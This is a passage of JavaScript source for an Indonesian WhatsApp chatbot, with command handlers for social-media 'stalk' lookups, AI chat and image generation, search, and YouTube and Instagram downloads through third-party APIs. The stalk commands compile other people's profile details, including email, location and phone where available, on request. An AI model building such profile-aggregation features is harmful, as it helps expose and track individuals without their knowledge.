    teks += `➤ *Videos*: ${userInfo.stats.totalVideos || '-'}\n`;
    teks += `➤ *Following*: ${userInfo.stats.following || '-'}\n`;
    teks += `➤ *Profile URL*: [${userInfo.profileUrl || '-'}]\n`;
    teks += `➤ *Profile Picture*: ${userInfo.profilePicture || '-'}\n\n`;

    teks += `*Hashtags Used*\n`;
    userInfo.hashtags.forEach(hashtag => {
      teks += `➤ #${hashtag}\n`;
    });
    teks += `\n*Recent Posts*\n`;

    userInfo.recentPosts.forEach(post => {
      teks += `➤ *Description*: ${post.description}\n`;
      teks += `➤ *Likes*: ${post.likes}\n`;
      teks += `➤ *Comments*: ${post.comments}\n`;
      teks += `➤ *Shares*: ${post.shares}\n`;
      teks += `➤ *Views*: ${post.views}\n`;
      teks += `➤ *Created At*: ${post.createdTime}\n`;
      teks += `➤ *Post Image*: ${post.image}\n\n`;
    });

    // Kirim foto profil dengan caption data lengkap
    await Xlesy.sendMessage(m.chat, {
      image: { url: userInfo.profilePicture },
      caption: teks
    }, { quoted: m });

  } catch (e) {
    console.error(e);
    Replyx('Terjadi kesalahan!');
  }
}
break;
case 'twiterstalk': {
  if (!q) return Replyx(`Contoh penggunaan:\n${prefix + command} Username`);

  let username = q.trim();
  if (!username) {
    return Replyx(`Format salah!\nContoh: ${prefix + command} username`);
  }

  Replyx(mess.load);

  try {
    let res = await fetch(`https://fastrestapis.fasturl.cloud/stalk/twitter?username=${username}`);
    let data = await res.json();

    if (data.status !== 200 || !data.result || !data.result.userInfo) {
      return Replyx("User tidak ditemukan atau API error.");
    }

    let userInfo = data.result.userInfo;
    let shadowBanInfo = data.result.shadowBanInfo;
    let teks = `*Twitter Stalker Result*\n\n`;
    teks += `➤ *Name*: ${userInfo.name || '-'}\n`;
    teks += `➤ *Username*: @${userInfo.screenName || '-'}\n`;
    teks += `➤ *Location*: ${userInfo.location || '-'}\n`;
    teks += `➤ *Description*: ${userInfo.description || '-'}\n`;
    teks += `➤ *Followers*: ${userInfo.followersCount || '-'}\n`;
    teks += `➤ *Following*: ${userInfo.followingCount || '-'}\n`;
    teks += `➤ *Friends*: ${userInfo.friendsCount || '-'}\n`;
    teks += `➤ *Likes*: ${userInfo.likeCount || '-'}\n`;
    teks += `➤ *Tweets*: ${userInfo.tweetCount || '-'}\n`;
    teks += `➤ *Twitter URL*: [${userInfo.url || '-'}]\n`;
    teks += `➤ *Website*: [${userInfo.website.display_url || '-'}]\n\n`;

    teks += `*Shadow Ban Info*\n`;
    teks += `➤ *Unfollowed*: ${shadowBanInfo.unfollowed ? 'Yes' : 'No'}\n`;
    teks += `➤ *Ghost Ban*: ${shadowBanInfo.ghostBan ? 'Yes' : 'No'}\n`;
    teks += `➤ *No Tweet*: ${shadowBanInfo.noTweet ? 'Yes' : 'No'}\n`;
    teks += `➤ *Not Found*: ${shadowBanInfo.notFound ? 'Yes' : 'No'}\n`;
    teks += `➤ *Protect*: ${shadowBanInfo.protect ? 'Yes' : 'No'}\n`;
    teks += `➤ *Reply Deboosting*: ${shadowBanInfo.replyDeboosting ? 'Yes' : 'No'}\n`;
    teks += `➤ *Search Ban*: ${shadowBanInfo.searchBan ? 'Yes' : 'No'}\n`;
    teks += `➤ *Search Suggestion Ban*: ${shadowBanInfo.searchSuggestionBan ? 'Yes' : 'No'}\n`;
    teks += `➤ *Suspend*: ${shadowBanInfo.suspend ? 'Yes' : 'No'}\n\n`;

    // Kirim foto profil dengan caption data lengkap
    await Xlesy.sendMessage(m.chat, {
      image: { url: userInfo.profileImageUrl },
      caption: teks
    }, { quoted: m });

  } catch (e) {
    console.error(e);
    Replyx('Terjadi kesalahan!');
  }
}
break;
case 'igstalk': {
  if (!q) return Replyx(`Contoh penggunaan:\n${prefix + command} username`);

  let username = q.trim();
  if (!username) {
    return Replyx(`Format salah!\nContoh: ${prefix + command} username`);
  }

  Replyx(mess.load);

  try {
    let res = await fetch(`https://fastrestapis.fasturl.cloud/stalk/instagram?username=${username}`);
    let data = await res.json();

    if (data.status !== 200 || !data.result) {
      return Replyx("User tidak ditemukan atau API error.");
    }

    let result = data.result;
    let teks = `*Instagram Stalker Result*\n\n`;
    teks += `➤ *Name*: ${result.name || '-'}\n`;
    teks += `➤ *Description*: ${result.description || '-'}\n`;
    teks += `➤ *Followers*: ${result.followers || '-'}\n`;
    teks += `➤ *Uploads*: ${result.uploads || '-'}\n`;
    teks += `➤ *Engagement Rate*: ${result.engagementRate || '-'}\n`;
    teks += `➤ *Average Activity*: ${result.averageActivity || '-'}\n`;
    teks += `➤ *Posts Per Day*: ${result.postsPerDay || '-'}\n`;
    teks += `➤ *Posts Per Week*: ${result.postsPerWeek || '-'}\n`;
    teks += `➤ *Posts Per Month*: ${result.postsPerMonth || '-'}\n`;
    teks += `➤ *Hashtags*: ${result.hashtags.join(', ') || '-'}\n\n`;

    teks += `*Most Commented Posts*\n`;
    if (result.mostCommentedPosts && result.mostCommentedPosts.length > 0) {
      for (let post of result.mostCommentedPosts) {
        teks += `➤ *Likes*: ${post.likes} | *Comments*: ${post.comments} | [Link](${post.link})\n`;
      }
    } else {
      teks += 'No most commented posts found.\n';
    }

    teks += `\n*Most Liked Posts*\n`;
    if (result.mostLikedPosts && result.mostLikedPosts.length > 0) {
      for (let post of result.mostLikedPosts) {
        teks += `➤ *Likes*: ${post.likes} | *Comments*: ${post.comments} | [Link](${post.link})\n`;
      }
    } else {
      teks += 'No most liked posts found.\n';
    }

    // Kirim gambar profil dengan caption data lengkap
    await Xlesy.sendMessage(m.chat, {
      image: { url: `https://www.instagram.com/${username}/profile_pic/` },
      caption: teks
    }, { quoted: m });

  } catch (e) {
    console.error(e);
    Replyx('Terjadi kesalahan!');
  }
}
break;
  case 'mlstalk':
  if (!q) return Replyx(`Contoh penggunaan:\n${prefix + command} id|zone`);
  
  let [userId, zoneId] = q.split('|').map(v => v.trim());
  
  if (!userId || !zoneId || !/^\d+$/.test(userId) || !/^\d+$/.test(zoneId)) {
    return Replyx(`Format salah!\nContoh: ${prefix + command} id|zone`);
  }

  Replyx(mess.load);

  try {
    let res = await fetch(`https://fastrestapis.fasturl.cloud/stalk/mlbb?userId=${userId}&zoneId=${zoneId}`);
    let data = await res.json();
    
    if (data.status != 200 || !data.result) {
      return Replyx("User tidak ditemukan atau API error.");
    }
    
    let info = data.result;
    
    let teks = `*MLBB Stalker*\n\n`;
    teks += `➤ *Username*: ${info.username || '-'}\n`;
    teks += `➤ *Region*: ${info.region || '-'}\n`;

    Replyx(teks);

  } catch (err) {
    console.error(err);
    Replyx("User tidak ditemukan atau API error.");
  }
  break;    
case 'ghstalk': {
  if (!q) return Replyx('Masukkan username GitHub!\nContoh: .ghstalk Gxyenn');
  Replyx(mess.load)
  let url = `https://fastrestapis.fasturl.cloud/stalk/github?username=${q}`;
  try {
    let res = await fetch(url);
    let json = await res.json();
    if (json.status !== 200) return Replyx('Data tidak ditemukan!');

    let result = json.result.data;
    let teks = `*「 GITHUB STALK 」*\n\n` +
      `*Username:* ${result.login}\n` +
      `*Name:* ${result.name || '-'}\n` +
      `*ID:* ${result.id}\n` +
      `*Bio:* ${result.bio || '-'}\n` +
      `*Company:* ${result.company || '-'}\n` +
      `*Blog:* ${result.blog || '-'}\n` +
      `*Location:* ${result.location || '-'}\n` +
      `*Email:* ${result.email || '-'}\n` +
      `*Hireable:* ${result.hireable ? 'Yes' : 'No'}\n` +
      `*Type:* ${result.type}\n` +
      `*Site Admin:* ${result.site_admin ? 'Yes' : 'No'}\n` +
      `*Followers:* ${result.followers}\n` +
      `*Following:* ${result.following}\n` +
      `*Public Repos:* ${result.public_repos}\n` +
      `*Public Gists:* ${result.public_gists}\n` +
      `*Account Created:* ${result.created_at}\n` +
      `*Last Updated:* ${result.updated_at}\n` +
      `*GitHub URL:* ${result.html_url}\n\n`;

    teks += `*「 Repositories 」*\n`;
    if (result.repositories && result.repositories.length > 0) {
      for (let repo of result.repositories) {
        teks += `\n> *Name:* ${repo.name}\n` +
                `> *Description:* ${repo.description || '-'}\n` +
                `> *Language:* ${repo.language || '-'}\n` +
                `> *Stars:* ${repo.stargazers_count}\n` +
                `> *Issues:* ${repo.open_issues_count}\n` +
                `> *Forked:* ${repo.fork ? 'Yes' : 'No'}\n`;
      }
    } else {
      teks += 'No repositories found.\n';
    }

    // Kirim foto profil dengan caption data lengkap
    await Xlesy.sendMessage(m.chat, {
      image: { url: result.avatar_url },
      caption: teks
    }, { quoted: m });

  } catch (e) {
    console.error(e);
    Replyx('Terjadi kesalahan!');
  }
}
break;
case 'chwastalk': {
  if (!q) return Replyx('Masukkan link WhatsApp Channel!\nContoh: .chwastalk https://whatsapp.com/channel/xxxxxx');
  Replyx(mess.load)
  let url = `https://fastrestapis.fasturl.cloud/stalk/wachannel?url=${encodeURIComponent(q)}`;
  try {
    let res = await fetch(url);
    let json = await res.json();
    if (json.status !== 200) return Replyx('Data tidak ditemukan atau link salah!');

    let result = json.result;
    let teks = `*「 WA CHANNEL STALK 」*\n\n` +
      `*Name:* ${result.name}\n` +
      `*Followers:* ${result.followers}\n` +
      `*Description:*\n${result.description}\n\n` +
      `*Channel Link:* ${result.channelLink}\n` +
      `*Creator:* ${json.creator}\n`;

    // Kirim foto channel dengan caption data lengkap
    await Xlesy.sendMessage(m.chat, {
      image: { url: result.image },
      caption: teks
    }, { quoted: m });

  } catch (e) {
    console.error(e);
    Replyx('Terjadi kesalahan saat mengambil data!');
  }
}
break;
  case 'ytstalk': {
  if (!q) return Replyx('Masukkan username YouTube!\nContoh: .ytstalk Gxyenn');
  Replyx(mess.load)
  let url = `https://fastrestapis.fasturl.cloud/stalk/youtube/simple?username=${q}`;
  try {
    let res = await fetch(url);
    let json = await res.json();
    if (json.status !== 200) return Replyx('Data tidak ditemukan!');

    let result = json.result;
    let teks = `*「 YOUTUBE STALK 」*\n\n` +
      `*Channel:* ${result.channel}\n` +
      `*Description:* ${result.description}\n` +
      `*URL Channel:* ${result.url}\n` +
      `*Custom URL:* ${result.additionalInfo.chUrl}\n` +
      `*Region:* ${result.additionalInfo.region || '-'}\n` +
      `*Phone:* ${result.additionalInfo.phone || '-'}\n` +
      `*Join Date:* ${result.additionalInfo.join}\n` +
      `*Subscribers:* ${result.additionalInfo.totalSubs}\n` +
      `*Total Videos:* ${result.additionalInfo.totalVideos}\n` +
      `*Total Views:* ${result.additionalInfo.views}\n\n`;

    teks += `*Latest Videos:*\n`;
    for (let vid of result.latestVideos) {
      teks += `\n> *Title:* ${vid.title}\n` +
              `> *Views:* ${vid.views}\n` +
              `> *Published:* ${vid.published}\n` +
              `> *Video URL:* ${vid.videoUrl}\n`;
    }

    // Kirim foto profil dengan caption data lengkap
    await Xlesy.sendMessage(m.chat, {
      image: { url: result.profile },
      caption: teks
    }, { quoted: m });

  } catch (e) {
    console.error(e);
    Replyx('Terjadi kesalahan!');
  }
}
break;
case 'bandlabstalk': {
  if (!q) return Replyx('Masukkan username BandLab!\nContoh: .bandlabstalk Namenya');
  Replyx(mess.load)
  let url = `https://fastrestapis.fasturl.cloud/stalk/bandlab?username=${encodeURIComponent(q)}`;
  try {
    let res = await fetch(url);
    let json = await res.json();
    if (json.status !== 200) return Replyx('Data tidak ditemukan atau username salah!');

    let result = json.result;
    let teks = `*「 BANDLAB STALK 」*\n\n` +
      `*Name:* ${result.name}\n` +
      `*Username:* ${result.username}\n` +
      `*ID:* ${result.id}\n` +
      `*About:* ${result.about ? result.about : '-'}\n` +
      `*Collaboration Status:* ${result.collaborationStatus}\n` +
      `*Followers:* ${result.counters.followers}\n` +
      `*Following:* ${result.counters.following}\n` +
      `*Created On:* ${result.createdOn}\n\n`;

    teks += `*Genres:*\n`;
    if (result.genres && result.genres.length > 0) {
      for (let genre of result.genres) {
        teks += `- ${genre.name}\n`;
      }
    } else {
      teks += '-\n';
    }

    teks += `\n*Skills:*\n`;
    if (result.skills && result.skills.length > 0) {
      for (let skill of result.skills) {
        teks += `- ${skill.name}\n`;
      }
    } else {
      teks += '-\n';
    }

    teks += `\n*Creator:* ${json.creator}\n`;
    teks += `*Content:* ${json.content}`;

    // Kirim foto profil dengan caption data lengkap
    await Xlesy.sendMessage(m.chat, {
      image: { url: result.picture },
      caption: teks
    }, { quoted: m });

  } catch (e) {
    console.error(e);
    Replyx('Terjadi kesalahan saat mengambil data!');
  }
}
break;
case 'minicraftstalk': {
  if (!q) return Replyx('Masukkan username Minecraft!\nContoh: .minicraftstalk Namanya');
  Replyx(mess.load)
  let url = `https://fastrestapis.fasturl.cloud/stalk/minecraft?username=${encodeURIComponent(q)}`;
  try {
    let res = await fetch(url);
    let json = await res.json();
    if (json.status !== 200) return Replyx('Data tidak ditemukan atau username salah!');

    let result = json.result;
    let teks = `*「 MINECRAFT STALK 」*\n\n` +
      `*Username:* ${result.username}\n` +
      `*UUID:* ${result.id}\n` +
      `*Raw ID:* ${result.rawId}\n\n` +
      `*Skin Texture URL:*\n${result.skinTexture}\n\n` +
      `*Creator:* ${json.creator}\n\n` +
      `*Content:* ${json.content}\n`;

    await Xlesy.sendMessage(m.chat, {
      image: { url: result.avatar },
      caption: teks
    }, { quoted: m });

  } catch (e) {
    console.error(e);
    Replyx('Terjadi kesalahan saat mengambil data!');
  }
}
break;
            //ai menumenu
           case 'aigen':
case 'aiimage': {
    if (!text) return Replyx(`Masukkan prompt gambar!\n\nContoh: .aigen anime girl with blue hair`);

    Replyx(mess.load);

    try {
        const axios = require("axios");

        async function generateImage(prompt) {
            const url = `https://1yjs1yldj7.execute-api.us-east-1.amazonaws.com/default/ai_image?prompt=${encodeURIComponent(prompt)}&aspect_ratio=1:1&link=writecream.com`;

            const headers = {
                "User-Agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Mobile Safari/537.36",
                "Referer": "https://www.writecream.com/ai-image-generator-free-no-sign-up/"
            };

            let { data } = await axios.get(url, { headers });
            if (data && data.image_link) return { success: true, imageUrl: data.image_link };
            return { success: false, message: "Gagal mendapatkan gambar!" };
        }

        let result = await generateImage(text);
        if (!result.success) return Replyx(result.message);

        await Xlesy.sendMessage(m.chat, { react: { text: '🎨', key: m.key } });

        await Xlesy.sendMessage(m.chat, { 
            image: { url: result.imageUrl }, 
            caption: `🖼️ *AI Image Generator*\n\n🎨 *Prompt:* ${text}` 
        }, { quoted: m });

        Replyx("✅ Gambar berhasil dibuat!");
    } catch (err) {
        console.error(err);
        Replyx("Terjadi kesalahan saat membuat gambar!");
    }
}
break;
case "autoai":
case "autoaixlesy":
case 'xlesyai': {
    if (!q) return Replyx(`*Contoh:* .autoai *[on/off/reset]*`);

    if (text === "on") {
        globalAutoAIStatus = true;
        sessions = {}; 
        saveSession();
        return m.reply(`[ ✅ ] *Auto AI diaktifkan di semua chat!* Bot akan merespon otomatis di semua percakapan.`);
    } else if (text === "off") {
        globalAutoAIStatus = false;
        sessions = {}; 
        saveSession();
        return Replyx(`[ ❌ ] *Auto AI dimatikan di semua chat!* Bot hanya merespon jika dipanggil.`);
    } else if (text === "reset") {
        if (globalAutoAIStatus) {
            sessions = {};
            saveSession();
            return Replyx("♻️ *Seluruh riwayat chat AI telah direset!*");
        } else {
            return Replyx("⚠️ *Auto AI sedang tidak aktif!*");
        }
    }
}
break
           case "xlesy":
case "aixlesy":
    if (!args.length) {
        return Replyx(`_*Iya Kak?*_`);
    }

    const query = encodeURIComponent(args.join(" "));
    const apiUrl = `https://api.siputzx.my.id/api/ai/gpt3?prompt=kamu%20adalah%20ai%20bernama%20Xlesy%20lalu%20kamu%20juga%20mempunyai%20Channel%20bernama%20Gxyenn%20dan%20kamu%20di%20buat%20oleg%20Gxyenn%20kamu%20juga%20mempunyai%20Saluran%20WhatsApp%20linknya%20https://whatsapp.com/channel/0029Vap5nJh2UPBDIc9bja1s,Jawab%20semua%20pesan%20dengan%20sopan%20dan%20ceria&content=hai${query}`;

    try {
        const response = await fetch(apiUrl);
        const data = await response.json();

        if (!data?.status || !data?.data) {
            return Replyx("❌ AI tidak dapat memberikan jawaban.");
        }

        Replyx(`*AI Response:*\n${data.data}`);
    } catch (error) {
        console.error("Error fetching AI response:", error);
        Replyx("Terjadi kesalahan saat mengakses AI. Silakan coba lagi nanti.");
    }
    break;
            case 'ai': {
                if (!text) return Replyx(`Example: ${prefix + command} query`, {
                    quoted: fkontak1
                })
                try {
                    let hasil = await yanzGpt(text)
                    m.reply(hasil.choices[0].message.content)
                } catch (e) {
                    try {
                        let hasil = await youSearch(text)
                        m.reply(hasil)
                    } catch (e) {
                        try {
                            let hasil = await bk9Ai(text)
                            m.reply(hasil.BK9)
                        } catch (e) {
                            m.reply(pickRandom(['Fitur Ai sedang bermasalah!', 'Tidak dapat terhubung ke ai!', 'Sistem Ai sedang sibuk sekarang!', 'Fitur sedang tidak dapat digunakan!']), {
                                quoted: fkontak1
                            })
                        }
                    }
                }
            }
            break
            case 'simi': {
                if (!text) return Replyx(`Example: ${prefix + command} query`, {
                    quoted: fkontak1
                })
                try {
                    const hasil = await simi(text)
                    m.reply(hasil.success)
                } catch (e) {
                    Replyx('Server simi sedang offline!', {
                        quoted: fkontak1
                    })
                }
            }
            break

            case 'txt2img':
            case 'texttoimage': {
                if (!isLimit) return Replyx(mess.limit)
                if (!text) return Replyx(`Example: ${prefix + command} anime, HD`, {
                    quoted: fkontak1
                })
                try {
                    await Xlesy.sendFileUrl(m.chat, `https://widipe.com/ai/text2img?text=${encodeURIComponent(text)}`, 'Done', m)
                    setLimit(m, db)
                } catch (e) {
                    Replyx('Gagal Create Gambar!', {
                        quoted: fkontak1
                    })
                }
            }
            break

            // Search Menu
            case 'searchgroup': {
            if (!q) return Replyx(`Example: ${prefix + command} bot wa`);
            Replyx(mess.load)
                await Xlesy.sendMessage(m.chat, {
                    react: {
                        text: '🔍',
                        key: m.key
                    }
                })               
                try {
                    let anu = `https://api.agungny.my.id/api/searchgroup?q=${encodeURIComponent(text)}`;
                    let response = await fetch(anu);
                    let data = await response.json();

                    if (!data || !data.result || data.result.length === 0) {
                        return Replyx('Tidak ditemukan grup WhatsApp yang sesuai dengan pencarian!');
                    }

                    let hasil = `*📌 Hasil Pencarian Grup WhatsApp: "${text}" 📌*\n\n`;
                    data.result.slice(0, 5).forEach((group, i) => {
                        hasil += `*${i + 1}. ${group.title}*\n`;
                        hasil += `👤 Member: ${group.members}\n`;
                        hasil += `🔗 Link: ${group.link}\n\n`;
                    });

                    m.reply(hasil, {
                        quoted: fkontak1
                    })
                } catch (e) {
                    console.error(e);
                    Replyx('Terjadi kesalahan saat mencari grup WhatsApp!');
                }
            }
            break;
            case 'google': {
                await Xlesy.sendMessage(m.chat, {
                    react: {
                        text: '🔍',
                        key: m.key
                    }
                })
                if (!text) return Replyx(`Example: ${prefix + command} query`, {
                    quoted: fkontak1
                })
                try {
                    let anu = await youSearch(text);
                    m.reply(anu)
                } catch (e) {
                    try {
                        let anu = await yanzGpt(text);
                        m.reply(hasil.choices[0].message.content)
                    } catch (e) {
                        Replyx('Pencarian Tidak Ditemukan!', {
                            quoted: fkontak1
                        })
                    }
                }
            }
            await Xlesy.sendMessage(m.chat, {
                react: {
                    text: '✅',
                    key: m.key
                }
            })
            break
            case 'gimage': {
                await Xlesy.sendMessage(m.chat, {
                    react: {
                        text: '🔍',
                        key: m.key
                    }
                })
                if (!text) return Replyx(`Example: ${prefix + command} query`, {
                    quoted: fkontak1
                })
                gis(text, async (err, result) => {
                    if (err) return m.reply(`Image Untuk Query : _${text}_\nTidak Ditemukan!`, {
                        quoted: fkontak1
                    })
                    if (result == undefined) {
                        m.reply(`Image Untuk Query : _${text}_\nTidak Ditemukan!`, {
                            quoted: fkontak1
                        })
                    } else if (result.length > 1) {
                        let anu = pickRandom(result)
                        await m.reply({
                            image: {
                                url: anu.url
                            },
                            caption: 'Url : ' + anu.url
                        })
                    } else Replyx('Gagal Mencari Gambar!', {
                        quoted: fkontak1
                    })
                });
            }
            break
            case 'searchspotify':
            case 'sspotify': {
                if (!text) return m.reply(`Gunakan contoh: ${prefix + command} judul lagu`, {
                    quoted: fkontak1
                })

                try {
                    let query = encodeURIComponent(text);
                    let response = await fetch(`https://api.agungny.my.id/api/spotifys?q=${query}`);
                    let data = await response.json();

                    if (!data || !data.result || data.result.length === 0) {
                        return Replyx('❌ Lagu tidak ditemukan!', {
                            quoted: fkontak1
                        })
                    }

                    let lagu = data.result[0]; // Ambil hasil pertama
                    let pesan = `🎵 *Spotify Search*\n\n`;
                    pesan += `📌 *Judul:* ${lagu.title}\n`;
                    pesan += `👤 *Artis:* ${lagu.artist}\n`;
                    pesan += `📀 *Album:* ${lagu.album}\n`;
                    pesan += `🔗 *Link:* ${lagu.url}\n`;

                    Xlesy.sendMessage(from, {
                        image: {
                            url: lagu.thumb
                        },
                        caption: pesan
                    }, {
                        quoted: fkontak1
                    });
                } catch (error) {
                    console.error(error);
                    Replyx('❌ Terjadi kesalahan saat mencari lagu.', {
                        quoted: fkontak1
                    });
                }
            }
            break;
case 'play':
case 'ytplay':
case 'yts':
case 'ytsearch':
case 'youtubesearch': {
if (!q) return Replyx(`Example: ${prefix + command} blue yung kai`)
Replyx(mess.load)
    await Xlesy.sendMessage(m.chat, {
        react: {
            text: '🔍',
            key: m.key
        }
    })    
    try {
        const res = await yts.search(text);
        const hasil = pickRandom(res.all);
        const teksnya = `*📍Title:* ${hasil.title || 'Tidak tersedia'}\n*✏Description:* ${hasil.description || 'Tidak tersedia'}\n*🌟Channel:* ${hasil.author?.name || 'Tidak tersedia'}\n*⏳Duration:* ${hasil.seconds || 'Tidak tersedia'} second (${hasil.timestamp || 'Tidak tersedia'})\n*🔎Source:* ${hasil.url || 'Tidak tersedia'}\n\n_note : jika ingin mendownload silahkan tekan button di bawah!.._`;

        const buttons = {
            buttonsMessage: {
                contentText: teksnya,
                footerText: "© XLESYVIP",
                buttons: [
                    {
                        buttonId: `.ytmp3 ${hasil.url}`,
                        buttonText: { displayText: "Audio.." },
                        type: 1
                    },
                    {
                        buttonId: `.ytmp4 ${hasil.url}`,
                        buttonText: { displayText: "Video.." },
                        type: 1
                    }
                ],
                headerType: 4,
                imageMessage: await prepareWAMessageMedia(
                    { image: { url: hasil.thumbnail } },
                    { upload: Xlesy.waUploadToServer }
                ).then(media => media.imageMessage),
                mentionedJid: [m.sender]
            }
        };

        const generatedMessage = await generateWAMessageFromContent(
            m.chat,
            buttons,
            { userJid: m.sender, quoted: fkontak1 }
        );

        await Xlesy.relayMessage(m.chat, generatedMessage.message, {
            additionalNodes: [{
                tag: "biz",
                attrs: {},
                content: [{
                    tag: "interactive",
                    attrs: { type: "native_flow", v: "1" },
                    content: [{
                        tag: "native_flow",
                        attrs: { name: "quick_reply" }
                    }]
                }]
            }]
        });

    } catch (e) {
        Replyx('Post not available!', { quoted: fkontak1 });
    }
}
await Xlesy.sendMessage(m.chat, {
    react: {
        text: '✅',
        key: m.key
    }
})
break;
            case 'pixiv': {
                if (!isLimit) return Replyx(mess.limit)
                if (!text) return Replyx(`Example: ${prefix + command} hu tao`, {
                    quoted: fkontak1
                })
                try {
                    let {
                        pixivdl
                    } = require('./lib/pixiv')
                    let res = await pixivdl(text)
                    Replyx(mess.wait)
                    for (let i = 0; i < res.media.length; i++) {
                        let caption = i == 0 ? `${res.caption}\n\n*By:* ${res.artist}\n*Tags:* ${res.tags.join(', ')}` : ''
                        let mime = (await FileType.fromBuffer(res.media[i])).mime
                        await m.reply({
                            [mime.split('/')[0]]: res.media[i],
                            caption,
                            mimetype: mime
                        })
                    }
                    setLimit(m, db)
                } catch (e) {
                    Replyx('Post not available!', {
                        quoted: fkontak1
                    })
                }
            }
            break
            case "pint":
case "pinterest":
  {
    async function pinterest(query) {
      try {
        const { data } = await axios.get(
          `https://api.vreden.my.id/api/pinterest?query=${encodeURIComponent(query)}`
        );
        return data.result[Math.floor(Math.random() * data.result.length)];
      } catch (err) {
        throw Error(err.message);
      }
    }

    if (!text) return Replyx(`Contoh: .${command} Anime`);
    return Replyx(mess.wait)
    try {
      let hasil = await pinterest(text);
      if (!hasil) return Replyx("Gambar tidak ditemukan.");

      const buttons = [
        {
          buttonId: `${prefix}${command} ${text}`,
          buttonText: {
            displayText: "Next",
          },
          type: 1,
        },
      ];

      await Xlesy.sendMessage(
        m.chat,
        {
          image: { url: hasil },
          caption: (mess.done),
          footer: `Search By ${text}`,
          buttons: buttons,
          headerType: 1,          
        },
        { quoted: fkontak1 }
      );
    } catch (err) {
      console.error(err.message);
      Replyx("Terjadi kesalahan saat mencari gambar.");
    }
  }
  break;
            case 'wallpaper': {
                if (!isLimit) return Replyx(mess.limit)
                if (!text) return Replyx(`Example: ${prefix + command} hu tao`, {
                    quoted: fkontak1
                })
                try {
                    let anu = await wallpaper(text)
                    let result = pickRandom(anu)
                    if (anu.length < 1) {
                        Replyx('Post not available!', {
                            quoted: fkontak1
                        })
                    } else {
                        await m.reply({
                            image: {
                                url: result.image[0]
                            },
                            caption: `⭔ title : ${q}\n⭔ category : ${result.type}\n⭔ media url : ${result.image[2] || result.image[1] || result.image[0]}`
                        }, {
                            quoted: fkontak1
                        })
                        setLimit(m, db)
                    }
                } catch (e) {
                    Replyx('Server wallpaper sedang offline!', {
                        quoted: fkontak1
                    })
                }
            }
            break
            case 'ringtone': {
                if (!isLimit) return Replyx(mess.limit)
                if (!text) return Replyx(`Example: ${prefix + command} black rover`, {
                    quoted: fkontak1
                })
                let anu = await ringtone(text)
                let result = pickRandom(anu)
                await m.reply({
                    audio: {
                        url: result.audio
                    },
                    fileName: result.title + '.mp3',
                    mimetype: 'audio/mpeg'
                }, {
                    quoted: fkontak1
                })
                setLimit(m, db)
            }
            break
            case 'npm':
            case 'npmjs': {
                if (!text) return Replyx(`Example: ${prefix + command} axios`, {
                    quoted: fkontak1
                })
                try {
                    let res = await fetch(`http://registry.npmjs.com/-/v1/search?text=${text}`, {
                        quoted: fkontak1
                    })
                    let {
                        objects
                    } = await res.json()
                    if (!objects.length) return Replyx('Pencarian Tidak di temukan', {
                        quoted: fkontak1
                    })
                    let txt = objects.map(({
                        package: pkg
                    }) => {
                        return `*${pkg.name}* (v${pkg.version})\n_${pkg.links.npm}_\n_${pkg.description}_`
                    }).join`\n\n`
                    m.reply(txt)
                } catch (e) {
                    Replyx('Pencarian Tidak di temukan', {
                        quoted: fkontak1
                    })
                }
            }
            break
            case 'style': {
                if (!text) return Replyx(`Example: ${prefix + command} Xlesy`, {
                    quoted: fkontak1
                })
                let anu = await styletext(text)
                let txt = anu.map(a => `*${a.name}*\n${a.result}`, {
                    quoted: fkontak1
                }).join`\n\n`
                m.reply(txt)
            }
            break
            case 'spotify':
            case 'spotifysearch': {
                if (!text) return Replyx(`Example: ${prefix + command} alan walker alone`, {
                    quoted: fkontak1
                })
                try {
                    let hasil = await fetchJson('https://www.bhandarimilan.info.np/spotisearch?query=' + encodeURIComponent(text));
                    let txt = hasil.map(a => {
                        return `*Name : ${a.name}*\n- Artist : ${a.artist}\n- Url : ${a.link}`
                    }).join`\n\n`
                    m.reply(txt)
                } catch (e) {
                    Replyx('Server Search Offline!', {
                        quoted: fkontak1
                    })
                }
            }
            break
            // Downloader Menu  
           case 'xytmp3':   
case 'ytaudio':   
case 'ytmp3':   
case 'yta': {  
    if (!text) return Replyx(`Gunakan: ${prefix + command} <url>`);  
    Replyx(mess.load)
    let url = args[0];

    try {          
        let response = await fetch(`https://api.hiuraa.my.id/downloader/savetube?url=${encodeURIComponent(url)}&format=mp3`);
        let result = await response.json();

        if (!result.status) return Replyx('Gagal mendapatkan audio.');

        
        let { result: metadata } = result;
        let captionInfo = `🎵 *${metadata.title}*\n⏱️ *Duration:* ${metadata.duration}\n🔗 *Bitrate:* ${metadata.quality}kbps`;

        await Xlesy.sendMessage(m.chat, {
            image: { url: metadata.thumbnail || '' },
            caption: captionInfo
        }, { quoted: m });

                await Xlesy.sendMessage(m.chat, { 
            audio: { url: metadata.download },
            mimetype: 'audio/mp4',
            fileName: `${metadata.title}.mp3`
        }, { quoted: m });

        
    } catch (err) {  
        console.error(err);  
        Replyx('Terjadi kesalahan.');  
    }  
}   
break;

case 'ytmp4':
case 'ytmp4v2':
case 'ytmp4-v2':
case 'ytmp42': {
    if (db.users[m.sender].limit < 1) {
        return Replyx(`Limit Anda Habis!\nAnda Dapat Mendapatkan Limit Dengan Cara:\n- .buy limit\n- .claim\n\nJika Anda Ingin Mendapatkan Limit Yang Banyak, Anda Dapat Membeli Premium!!`, { quoted: m });
    }
    if (args.length === 0) return Replyx('Masukkan URL YouTube!\nContoh: .ytmp4 https://youtube.com/shorts/MTwndYpbgu0', { quoted: m });

    let url = args[0];
    let resolution = '720'; // Default 720p

    // Jika ada resolusi yang disebutkan
    if (args.length > 1) {
        const availableRes = ['360', '480', '720', '1080'];
        if (availableRes.includes(args[1])) {
            resolution = args[1];
        } else {
            return Replyx(`Resolusi tidak valid!\nPilih: 360, 480, 720, 1080`, { quoted: m });
        }
    }

    await Replyx(`Loading...\nSedang Mengunduh Video`, { quoted: m });

    const axios = require('axios');
    const apiUrl = `https://api.hiuraa.my.id/downloader/savetube?url=${encodeURIComponent(url)}&format=${resolution}`;

    try {
        const { data } = await axios.get(apiUrl);
        if (!data.status || !data.result?.download) {
            return Replyx("*Gagal mengunduh video.*", { quoted: m });
        }

        await Xlesy.sendMessage(m.chat, { video: { url: data.result.download }, caption: `*YouTube Downloader Video V2*` }, { quoted: m });

    } catch (error) {
        return Replyx(`Terjadi kesalahan: ${error.message}`, { quoted: m });
    }
}
break
            case 'ig':
            case 'instagram':
            case 'instadl':
            case 'igdown':
            case 'igdl': {
                if (!isLimit) return Replyx(mess.limit)
